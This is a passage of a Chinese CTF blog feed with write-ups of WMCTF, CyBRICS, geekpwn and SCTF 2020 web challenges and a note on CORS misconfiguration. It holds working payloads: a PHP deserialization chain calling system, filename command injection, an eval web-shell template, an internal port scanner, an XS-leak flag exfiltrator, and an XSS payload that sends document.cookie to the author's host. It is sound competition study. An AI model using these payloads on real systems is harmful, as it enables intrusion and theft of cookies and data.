class="headerlink" title="webweb"></a>webweb</h2><p>这题本地测试成功远程不行，不知道为啥，静等其他人的wp</p><p>代码很简单：</p><pre><code class="php">&lt;?php// Kickstart the framework$f3=require(&#39;lib/base.php&#39;);$f3-&gt;set(&#39;DEBUG&#39;,1);if ((float)PCRE_VERSION&lt;8.0)    trigger_error(&#39;PCRE version is out of date&#39;);// Load configuration$f3-&gt;config(&#39;config.ini&#39;);$f3-&gt;route(&#39;GET /&#39;,    function($f3) {        echo &quot;just get me a,don&#39;t do anything else&quot;;    });unserialize($_GET[&#39;a&#39;]);$f3-&gt;run();</code></pre><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>又是一题反序列化</p><p>老规矩开局找入口点：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804104714.png" alt="image11496"></p><p>这里只有这一个入口点，这个入口点还挺不错的。</p><p>接下来我们可以考虑调用魔术方法或者是利用<code>$func($this)</code>来构造下一步</p><p>这里可以利用的魔术方法有：<code>__get</code>和<code>__call</code>，找了一波没啥好用的魔术方法，那么我们就利用<code>$func($this)</code>吧</p><p>接下来我们有两种思路：</p><ol><li>扩宽道路，就是找一个函数，里面调用有意思的方法的</li><li>确定pop链尾</li></ol><p>我这里是先扩宽反序列化的道路再去找链尾的，毕竟可以当链尾的太多了</p><p>慢慢找过去发现一个有意思的方法</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804105340.png" alt="image11818"></p><p>这里可以调用:<code>$func($url,false,true)</code>，如果我们能控制<code>$url</code>那么我们就能舒服多了，那么我们接下来就是要找个可以控制<code>$url</code>的地方</p><p>找着找着发现了<code>Base::run</code>这个方法</p><pre><code class="php">function run();</code></pre><p>可以直接利用<code>$func($this);</code>来调用它（对于用户自定义的函数/方法，多一些参数没啥影响，但是对大部分自带的函数就不行了，原因估计是自带的函数都是c编写的固定参数的函数），我们来看下它调用<code>reroute</code>的地方</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110131.png" alt="image12152"></p><p>我们可以看到确实<code>$url</code>是我们可以控制的，现在就是要让语句执行到这里，这个没啥好说的，有耐心一点慢慢调就ok了，直接换上payload了：</p><p>接下来就是需要找到一个合适的函数，本地fuzz自带的函数发现，exec是可以的，虽然它会报错</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110718.png" alt="image12361"></p><p>amazing，划重点这是要考的，虽然本地可以，但是</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110842.png" alt="image12473"></p><p>服务器上去测试就segment fault了，黯然离去.jpg</p><p>接下来我们只能去找框架的函数了</p><p>找着找着我找到了：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111008.png" alt="image12618"></p><p>这样一个东西，这个函数就很nice</p><p>我们传入<code>WEB-&gt;send(&#39;/flag&#39;,false,true);</code>那么我们就能得到<code>/flag</code>的内容了</p><p>最后payload如下：</p><pre><code class="php">&lt;?phpnamespace CLI{    class Agent {        protected            $server=&quot;&quot;,            $id=&quot;&quot;,            $socket=&quot;&quot;,            $flag=&quot;&quot;,            $verb=&quot;&quot;,            $uri=&quot;&quot;,            $headers=&quot;&quot;;        public $events;        public function check(){        }        public function __construct(){            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \base(),&quot;run&quot;)];            $this-&gt;server=&amp;$this;        }    };    class WS    {        protected            $addr=&quot;&quot;,            $ctx=&quot;&quot;,            $wait=&quot;&quot;,            $sockets=&quot;&quot;,            $protocol=&quot;&quot;,            $agents = [];        public $events = [&quot;disconnect&quot;=&gt;&quot;bbbbb&quot;];        public function __construct($val)        {            $this-&gt;addr = $val;        }    }}namespace DB{    abstract class Cursor  implements \IteratorAggregate {        protected            //! Flat-file DB wrapper            $db,            //! Data file            $file,            //! Document identifier            $id,            //! Document contents            $document=[],            //! field map-reduce handlers            $_reduce;    }}namespace DB\Jig{    use Traversable;    class Mapper extends \DB\Cursor{        protected            //! Flat-file DB wrapper            $db,            //! Data file            $file,            //! Document identifier            $id,            //! Document contents            $document=[],            //! field map-reduce handlers            $_reduce;        public function __construct(){            $this-&gt;db = new \base();            $this-&gt;file = &quot;index.php&quot;;        }        public function getIterator()        {            // TODO: Implement getIterator() method.        }        function exists($key)        {            // TODO: Implement exists() method.        }        function set($key, $val)        {            // TODO: Implement set() method.        }        function get($key)        {            // TODO: Implement get() method.        }        function clear($key)        {            // TODO: Implement clear() method.        }        public function offsetExists($offset)        {            // TODO: Implement offsetExists() method.        }        public function offsetGet($offset)        {            // TODO: Implement offsetGet() method.        }        public function offsetSet($offset, $value)        {            // TODO: Implement offsetSet() method.        }        public function offsetUnset($offset)        {            // TODO: Implement offsetUnset() method.        }    }}namespace {    abstract class Prefab {        static function instance() {            if (!Registry::exists($class=get_called_class())) {                $ref=new ReflectionClass($class);                $args=func_get_args();                Registry::set($class,                    $args?$ref-&gt;newinstanceargs($args):new $class);            }            return Registry::get($class);        }    }    final class Base extends Prefab implements ArrayAccess{        private            $hive,            $init,            $languages,            $locks=[],            $fallback=&#39;en&#39;;        public function __construct(){            $this-&gt;hive=[                &quot;ROUTES&quot;=&gt;[&#39;/flag/&#39;=&gt;[[&#39;GET&#39;=&gt;1]],&quot;2&quot;=&gt;1],                &quot;PATH&quot;=&gt;&#39;/flag/&#39;,#$url                &quot;QUERY&quot;=&gt;&quot;&quot;,                &quot;VERB&quot;=&gt;&quot;GET&quot;,                &quot;PARAMS&quot;=&gt;[],                &quot;ONREROUTE&quot;=&gt;&quot;WEB-&gt;send&quot;,#$func                &quot;CLI&quot;=&gt;&#39;123&#39;                ];        }        public function offsetExists($offset)        {        }        public function offsetGet($offset)        {        }        public function offsetSet($offset, $value)        {            // TODO: Implement offsetSet() method.        }        public function offsetUnset($offset)        {            // TODO: Implement offsetUnset() method.        }    }    abstract class Magic implements \ArrayAccess{    }    echo urlencode(serialize(new \CLI\WS(new \CLI\Agent())));}</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111403.png" alt="image16897"></p><p>然而在题目中它虽然执行了<code>WEB-&gt;send</code>方法（根据错误信息得知），但是并不会返回<code>/flag</code>（所有文件都读不了），希望有看到的师傅给个解答</p><h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>果然是我一句魔术方法里面没啥好用的这一句话断送了我的flag，有这样一个魔术方法</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804114525.png" alt="image17108"></p><p>它通过控制<code>$this-&gt;props</code>我们可以调用任意函数，那么我们只需要找到一个可控参数的位置就可以了</p><p>找到</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804120508.png" alt="image17250"></p><p>构造payload</p><pre><code class="php">&lt;?phpnamespace DB{    abstract class Cursor  implements \IteratorAggregate {}}namespace DB\SQL{    class Mapper extends \DB\Cursor{        protected            $props=[&quot;quotekey&quot;=&gt;&quot;system&quot;],            $adhoc=[&quot;ls -al&quot;=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],            $db;        function offsetExists($offset){}        function offsetGet($offset){}        function offsetSet($offset, $value){}        function offsetUnset($offset){}        function getIterator(){}        function __construct($val){            $this-&gt;db = $val;        }    }}namespace CLI{    class Agent {        protected            $server=&quot;&quot;;        public $events;        public function __construct(){            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];            $this-&gt;server=&amp;$this;        }    };    class WS{}}namespace {    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));}</code></pre><h2 id="Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0"></a>Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0</h2><p>这题是学长闲的无聊解出来的，说10分钟就ok的题目。。。膜拜</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804123108.png" alt="image18383"></p><p>实际调试的时候是这样的：</p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/RF5J9(A_2K%24)Z4VG%251B0WZI.png" alt="image18481"></p><p>上面还有一堆tsrm_realpath_r。</p><p>还有啥好说的？看代码。。。。</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/08/04/wmctf2020/">https://www.ccreater.top/2020/08/04/wmctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyBRICS2020</title>
      <link href="2020/07/29/CyBRICS2020/"/>
      <url>2020/07/29/CyBRICS2020/</url>
      
        <content type="html"><![CDATA[<h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p><p>flag:<code>cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}</code></p><h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p><pre><code>if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):    exit()...def allowed_file(filename):    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONSallowed_file(file.filename)...command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre><p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p><p>cybrics{imagesaresocoolicandrawonthem}</p><h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p><p>calc.php</p><pre><code class="php=">if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {        $value = &quot;BAD&quot;;    }else{    $value = eval(&quot;return $field;&quot;);}</code></pre><pre><code>9999999999999999999:1.0E+251/0:INF0/0:NANlog(0):-INF</code></pre><p>newtemplate.php</p><pre><code class="php=">        if (strpos($html, &#39;&lt;?&#39;) !== false) {            $error = &quot;Bad chars&quot;;            break;        }        ...        file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html);</code></pre><p>calc.php</p><pre><code class="php=">file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));</code></pre><p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p><p>新建template:</p><pre><code>*/)).eval($_POST[1])?&gt;$requiredBlocks = [            &#39;id=&quot;back&quot;&#39;,            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,            &#39;id=&quot;digit0&quot;&#39;,            &#39;id=&quot;digit1&quot;&#39;,            &#39;id=&quot;digit2&quot;&#39;,            &#39;id=&quot;digit3&quot;&#39;,            &#39;id=&quot;digit4&quot;&#39;,            &#39;id=&quot;digit5&quot;&#39;,            &#39;id=&quot;digit6&quot;&#39;,            &#39;id=&quot;digit7&quot;&#39;,            &#39;id=&quot;digit8&quot;&#39;,            &#39;id=&quot;digit9&quot;&#39;,            &#39;id=&quot;plus&quot;&#39;,            &#39;id=&quot;equals&quot;&#39;,        ];</code></pre><p>向calc post:<br><code>field=1/*&amp;share=1</code></p><p>flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</p><h2 id="Developer’s-Laptop"><a href="#Developer’s-Laptop" class="headerlink" title="Developer’s Laptop"></a>Developer’s Laptop</h2><p>看题目样子是xss题?SSRF?</p><p>浏览器信息：HeadlessChrome/79.0.3945.79 </p><p>填写脚本：</p><pre><code class="javascript=">a=document.getElementsByClassName(&quot;form-control&quot;);a[1].value=&quot;WQLSaidXUtQAfD6ptJc7Yg&quot;;a[0].value=&quot;http://ccreater.top:60000&quot;;</code></pre><p>返回包</p><pre><code>HEAD / HTTP/1.1Host: ccreater.top:60000User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveAccess-Control-Request-Method: POSTOrigin: prod.free-design-feedback-cybrics2020.ctf.suReferer: http://prod.free-design-feedback-cybrics2020.ctf.su</code></pre><p>等等开发人员的电脑？肯定一堆服务，内网扫描！</p><p>http服务扫描：</p><pre><code class="htmlmixed=">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var from = 1;var complete = true;var clear = false;function check(text){    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);    var cssLoaded = Boolean(linkEl.sheet);    linkEl.addEventListener(&#39;load&#39;, function () {        console.log(text)        // log        fetch(&quot;http://ccreater.top:60010/log.php?log=&quot;+text)            .then(r=&gt;r.text())            .then(d=&gt;{console.log(&quot;log success&quot;)})        // log end    });}function clearstyle(clear_from ,clear_to){    clear = true;    console.log(&quot;clear task start&quot;);    while(clear_to&lt;=clear_from){            document.head.querySelector(&#39;link[href$=&quot;:&#39;+clear_to+&#39;&quot;&#39;).remove();            clear_to++;    }    clear = false;    console.log(&quot;clear task end&quot;);}function make(text){    head = document.getElementsByTagName(&#39;head&#39;)[0];    var port = text;    var url = &quot;http://127.0.0.1:&quot;+port,    link = document.createElement(&#39;link&#39;);    link.rel = &quot;stylesheet&quot;;    link.href = url;    head.appendChild(link);    check(text);}async function scan(){    var to = from + 80 &gt; 65535 ? 65535 : from + 80;    for(var i=from;i&lt;to;i++){        make(String(i));    }    from +=80;    setTimeout(()=&gt;{clearstyle(from,to);},5000);};async function listener (){    console.log(&quot;listener works,from:&quot;+from+&quot;,complete:&quot;+complete);    if(from &lt; 65535){        setTimeout(listener,5000);        if(complete &amp;&amp; !clear){            console.log(&quot;new task!&quot;);            scan()                .then(()=&gt;{complete = true;})            complete = false;        }    }}listener()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>虽然我猜到了有内网服务但是到最后我还是没有扫到。。</p><p>脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/07/29/CyBRICS2020/">https://www.ccreater.top/2020/07/29/CyBRICS2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>geekpwn2020</title>
      <link href="2020/07/19/geekpwn2020/"/>
      <url>2020/07/19/geekpwn2020/</url>
      
        <content type="html"><![CDATA[<h1 id="geekpwn-2020热身赛"><a href="#geekpwn-2020热身赛" class="headerlink" title="geekpwn 2020热身赛"></a>geekpwn 2020热身赛</h1><h2 id="cosplay"><a href="#cosplay" class="headerlink" title="cosplay"></a>cosplay</h2><p>直接用cos的api读取文件</p><pre><code class="javascript">cos.getBucket({    Bucket: Bucket,    Region: Region,}, function(err, data) {    console.log(err || data.Contents);});cos.getObject({    Bucket: Bucket,    Region: Region,    Key: &#39;f1L9@/flag.txt&#39;,}, function(err, data) {    console.log(err || data.Body);});</code></pre><h2 id="noXss2020"><a href="#noXss2020" class="headerlink" title="noXss2020"></a>noXss2020</h2><pre><code class="python">from flask import Flask, request, jsonify, Responsefrom os import getenvapp = Flask(__name__)DATASET = {    114: &#39;514&#39;,    810: &#39;8931919&#39;,    2017: &#39;https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup&#39;,    2019: &#39;https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view&#39;,    2020: &#39;flag{2333333333}&#39;}@app.before_requestdef check_host():    pass@app.route(&quot;/&quot;)def index():    return app.send_static_file(&#39;index.html&#39;)@app.route(&quot;/search&quot;)def search_handler():    keyword = request.args.get(&#39;keyword&#39;)    if keyword is None:        return jsonify(DATASET)    else:        ret = {}        for i in DATASET:            if keyword in DATASET[i]:                ret[i] = DATASET[i]        return jsonify(ret), 200 if len(ret) else 404@app.after_requestdef add_security_headers(resp):    resp.headers[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;    resp.headers[&#39;Content-Security-Policy&#39;] = &#39;default-src \&#39;self\&#39;; frame-src https://www.youtube.com&#39;    resp.headers[&#39;X-Content-Type-Options&#39;] = &#39;nosniff&#39;    resp.headers[&#39;Referrer-Policy&#39;] = &#39;same-origin&#39;    return respif __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=3000, )</code></pre><p>我们注意到search是通过in来判断是否存在，并返回404或200</p><p>虽然<code>http://noxss2020.cal1.cn:3000/</code>有cors,但是我们并不需要他返回的内容，我们只需要状态码，这样就简单多了。我们将页面当成css来加载，通过是否加载成功来判断状态码</p><p>payload:</p><pre><code class="html">&lt;html&gt;&lt;body&gt;&lt;script&gt;var guess=&quot;flag&quot;;var ok=true;function check(text){    var linkEl = document.head.querySelector(&#39;link[href*=&quot;&#39;+text+&#39;&quot;&#39;);    var cssLoaded = Boolean(linkEl.sheet);    linkEl.addEventListener(&#39;load&#39;, function () {        guess=unescape(text);        console.log(guess)        ok=true;        if(guess.endsWith(&quot;}&quot;)){            location=&quot;http://ccreater.top:60010/log.php?log=&quot;+guess;        };        var s = guess.substr(0,guess.length-1);        while(tmp=document.head.querySelector(&#39;link[href*=&quot;&#39;+s+&#39;&quot;&#39;)){            tmp.remove();        }        fuzz()    });}function make(text){    head = document.getElementsByTagName(&#39;head&#39;)[0];    var url = &quot;http://127.0.0.1:3000/search?keyword=&quot;+escape(text),    link = document.createElement(&#39;link&#39;);    link.rel = &quot;stylesheet&quot;;    link.href = url;    head.appendChild(link);    check(escape(text));}async function fuzz(){    for(i of &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}&quot;){        if(make(guess+i)){            break;        }    }    return true}function exploit(){    fuzz()}fuzz()&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h2><p>阅读代码发现：</p><pre><code>function(e, t, r) {        &quot;use strict&quot;;        r.r(t);        r(91);        var n = {            mounted: function() {                window.addEventListener(&quot;message&quot;, (function(e) {                    if (e.origin.match(&quot;http://umsg.iffi.top&quot;))                        switch (e.data.action) {                        case &quot;append&quot;:                            return void (document.getElementsByTagName(&quot;main&quot;)[0].innerHTML += e.data.payload);                        case &quot;debug&quot;:                            return void console.log(e.data.payload);                        case &quot;ping&quot;:                            return void e.source.postMessage(&quot;pong&quot;, &quot;*&quot;)                        }                }                ), !1),                postMessage({                    action: &quot;ping&quot;                })            }        }</code></pre><p>那么我们可以在页面中嵌入iframe来postMessage,从而插入恶意内容，唯一的障碍是：<code>e.origin.match(&quot;http://umsg.iffi.top&quot;)</code></p><p>因为match是一个正则匹配函数，所以构造<code>http://umsg_iffi_top.evildomain</code>来绕过</p><p>payload:</p><pre><code>&lt;html&gt;&lt;body&gt;&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;&lt;/iframe&gt;&lt;script&gt;setTimeout(()=&gt;{document.body.children[0].contentWindow.postMessage({action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#39;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#39;&gt;&quot;},&quot;http://umsg.iffi.top:3000/&quot;)},5000);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/07/19/geekpwn2020/">https://www.ccreater.top/2020/07/19/geekpwn2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass CORS</title>
      <link href="2020/07/09/bypass%20CORS/"/>
      <url>2020/07/09/bypass%20CORS/</url>
      
        <content type="html"><![CDATA[<h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>CORS: Cross Origin Resource Share,设置在服务端，客户端执行的一种策略。</p><blockquote><p>出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求或者 跨站请求可以正常发起，但是返回结果被浏览器拦截了 。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。 </p></blockquote><h2 id="相关的字段"><a href="#相关的字段" class="headerlink" title="相关的字段"></a>相关的字段</h2><p>响应：</p><pre><code>Access-Control-Allow-OriginAccess-Control-Expose-HeadersAccess-Control-Max-AgeAccess-Control-Allow-CredentialsAccess-Control-Allow-MethodsAccess-Control-Allow-Headers</code></pre><p>请求：</p><pre><code>OriginAccess-Control-Request-MethodAccess-Control-Request-Headers</code></pre><h2 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h2><h3 id="根据某些字段来设置ACAO头"><a href="#根据某些字段来设置ACAO头" class="headerlink" title="根据某些字段来设置ACAO头"></a>根据某些字段来设置ACAO头</h3><pre><code>GET /sensitive-victim-data HTTP/1.1Host: vulnerable-website.comOrigin: https://malicious-website.comCookie: sessionid=...根据Origin头来设置Access-Control-Allow-OriginHTTP/1.1 200 OKAccess-Control-Allow-Origin: https://malicious-website.comAccess-Control-Allow-Credentials: true</code></pre><h3 id="对Origin头的错误解析"><a href="#对Origin头的错误解析" class="headerlink" title="对Origin头的错误解析"></a>对Origin头的错误解析</h3><p>因为要对子域名的支持，所以有些网站会这样写:</p><pre><code>if Origin.domain startwith &quot;domain.com&quot;:    return &quot;Access-Control-Allow-Origin: &quot;+Origin</code></pre><p>或者</p><pre><code>if Origin.domain endwith &quot;domain.com&quot;:    return &quot;Access-Control-Allow-Origin: &quot;+Origin</code></pre><p>像这种都很好绕过：</p><p>domain.com.evildomain.com 或者 evildomain-domain.com</p><h3 id="白名单中存在-null"><a href="#白名单中存在-null" class="headerlink" title="白名单中存在:null"></a>白名单中存在:null</h3><p> Origin支持值null，在某些情况下，浏览器可能会在Origin标头中发送值null：</p><ul><li><p>跨站点重定向</p></li><li><p>来自序列化数据的请求</p></li><li><p>使用<code>file</code>协议的请求</p></li><li><p>沙盒中的跨域请求</p></li></ul><h2 id="利用受信任的域"><a href="#利用受信任的域" class="headerlink" title="利用受信任的域"></a>利用受信任的域</h2><p>在受信任的域上找到xss，就可以绕过CORS</p><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>23333</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">https://portswigger.net/web-security/cors</a> </p><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/07/09/bypass">https://www.ccreater.top/2020/07/09/bypass</a> CORS/](<a href="https://www.ccreater.top/2020/07/09/bypass">https://www.ccreater.top/2020/07/09/bypass</a> CORS/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sctf2020</title>
      <link href="2020/07/07/sctf2020/"/>
      <url>2020/07/07/sctf2020/</url>
      
        <content type="html"><![CDATA[<h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网：</p><pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])def caculator():    try:        data = request.get_json()    except ValueError:        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})    num1 = str(data[&quot;num1&quot;])    num2 = str(data[&quot;num2&quot;])    symbols = data[&quot;symbols&quot;]    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre><p>可以进行符合条件的ssrf的只有</p><pre><code class="python">def flask_rpc(request):    if request.META[&#39;REMOTE_ADDR&#39;] != &quot;127.0.0.1&quot;:        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})    methods = request.GET.get(&quot;methods&quot;)    url = request.GET.get(&quot;url&quot;)    if methods == &quot;GET&quot;:        return JsonResponse(            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})    elif methods == &quot;POST&quot;:        data = base64.b64decode(request.GET.get(&quot;data&quot;))        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})    else:        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})</code></pre><p>但是需要<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>，利用 CVE-2018-14574跳转到127.0.0.1:8000访问/rpc ，这样我们就能ssti，在这之前我们需要搞到Token</p><pre><code class="python">@login_requireddef home(request):    if request.method == &quot;GET&quot;:        return render(request, &quot;templates/home.html&quot;)    elif request.method == &quot;POST&quot;:        white_list = [&quot;39.104.19.182&quot;]        try:            data = json.loads(request.body)        except ValueError:            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})        if Token.objects.all().first().Token == data[&quot;token&quot;]:            try:                if ssrf_check(data[&quot;url&quot;], white_list):                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})                else:                    res = requests.get(data[&quot;url&quot;], timeout=1)            except Exception:                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})            if res.status_code == 200:                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})            else:                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})        else:            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})</code></pre><pre><code class="python">def reg(request):    if request.method == &quot;GET&quot;:        return render(request, &quot;templates/reg.html&quot;)    elif request.method == &quot;POST&quot;:        try:            data = json.loads(request.body)        except ValueError:            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:            return JsonResponse({&quot;code&quot;: 1})        User.objects.create_user(**data)        return JsonResponse({&quot;code&quot;: 0})</code></pre><p>构造：<code>{&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true}</code></p><p>得到token:<code>3ad9af405504233188f694a11ff22115</code></p><p>接下来就是ssti了</p><pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])def caculator():    try:        data = request.get_json()    except ValueError:        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})    num1 = str(data[&quot;num1&quot;])    num2 = str(data[&quot;num2&quot;])    symbols = 